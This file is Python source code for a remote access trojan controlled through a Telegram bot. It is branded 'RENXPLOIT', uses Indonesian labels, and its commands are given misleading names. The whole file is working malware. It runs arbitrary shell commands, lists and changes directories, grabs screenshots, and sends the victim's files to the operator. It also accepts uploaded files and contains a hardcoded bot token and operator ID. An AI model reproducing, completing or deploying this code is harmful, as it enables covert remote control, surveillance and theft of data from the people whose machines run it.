from PIL import ImageGrab
from telepot.loop import MessageLoop

class RAT:
    def __init__(self):
        MessageLoop(bot, self.bot_handler).run_as_thread()
        print("Bot RENXPLOIT AKTIF.")
        for chat in trusted_chats:
            bot.sendMessage(chat, " ^= ^v Bot connected.")
        for user in trusted_users:
            bot.sendMessage(user, " ^= ^v Bot connected.")

        while True:
            time.sleep(10)

    def bot_handler(self, message):
        print(message)

        userid = message["from"]["id"]
        chatid = message["chat"]["id"]

        if userid in trusted_users or chatid in trusted_chats:
            try:
                args = message["text"].split()
            except KeyError:
                args = [""]

                if "document" in message:
                    file_id = message["document"]["file_id"]
                    file_name = message["document"]["file_name"]
                elif "photo" in message:
                    file_id = message["photo"][-1]["file_id"]
                    file_name = "{}.jpg".format(file_id)

                file_path = bot.getFile(file_id)["file_path"]
                link = f"https://api.telegram.org/file/bot{token}/{file_path}"
                File = requests.get(link, stream=True).raw

                save_path = os.path.join(os.getcwd(), file_name)
                with open(save_path, "wb") as out_file:
                    shutil.copyfileobj(File, out_file)

                bot.sendMessage(message["chat"]["id"], "file uploaded")

            if args[0] == "/menu untuk lihat fitur bot by renxploit":
                s = """/menu untuk lihat fitur bot by renxploit
                    /BAND IG BY RENXPLOIT
                    /BAND TELE BY RENXPLOIT
                    /BAND WHATSAPP BY RENXPLOIT
                    /BAND TIKTOK BY RENXPLOIT
                    /SADAP GALERI BY RENXPLOIT
                    /SADAP HP BY RENXPLOIT
                    /HACK FILE BY RENXPLOIT
                """
                bot.sendMessage(message["chat"]["id"], str(s))

            elif args[0] == "BAND IG BY RENXPLOIT":
                try:
                    s = "[*] {}".format(subprocess.check_output(' '.join(args[1:]), shell=True).decode())
                except Exception as e:
                    s = "[!] {}".format(e)

                bot.sendMessage(message["chat"]["id"], "{}".format(str(s)))

            elif args[0] == "/BAND TELE BY RENXPLOIT":
                try:
                    s = "BOT RENXPLOIT AKTIF"
                    subprocess.Popen(args[1:], shell=True)

                except Exception as e:
                    s = "[!] {}".format(str(e))
                bot.sendMessage(message["chat"]["id"], "{}".format(str(s)))

            elif args[0] == "/BAND WHATSAPP BY RENXPLOIT":
                try:
                    s = os.path.abspath(os.getcwd())
                except Exception as e:
                    s = e

                bot.sendMessage(message["chat"]["id"], "{}".format(str(s)))

            elif args[0] == "/BAND TIKTOK BY RENXPLOIT":
                if len(args) == 1:
                    pth = "."
                else:
                    pth = args[1]
                s = '\n'.join(os.listdir(path=pth))
                bot.sendMessage(message["chat"]["id"], "{}".format(str(s)))

            elif args[0] == "/SADAP GALERI BY RENXPLOIT":
                path = os.path.abspath(args[1])
                os.chdir(path)
                bot.sendMessage(message["chat"]["id"], "changing directory to {} ...".format(str(path)))

            elif args[0] == "/SADAP HP BY RENXPLOIT":
                image = ImageGrab.grab()
                image.save("pic.jpg")
                bot.sendDocument(message["chat"]["id"], open("pic.jpg", "rb"))
                os.remove("pic.jpg")

            elif args[0] == "/HACK FILE/KIRIM RAMSOWARE":
                File = ' '.join(map(str, args[1:]))
                try:
                    bot.sendDocument(message["chat"]["id"], open(File, "rb"))
                except Exception:
                    bot.sendMessage(message["chat"]["id"], "you must select the file")
            elif args[0] == "":
                pass

            else:
                bot.sendMessage(message["chat"]["id"], "/help To display commands")

        else:
            bot.sendMessage(message["chat"]["id"], ":D")


if __name__ == "__main__":
    token = "7592508764:AAEl5OIQxYwje-Vu3f65AXkKgK2GsYRlKRc"
    bot = telepot.Bot(token)

    trusted_users = [7720846619]  # ID Telegram pengguna terpercaya
    trusted_chats = []           # Tambahkan ID grup terpercaya jika perlu

    trojan = RAT()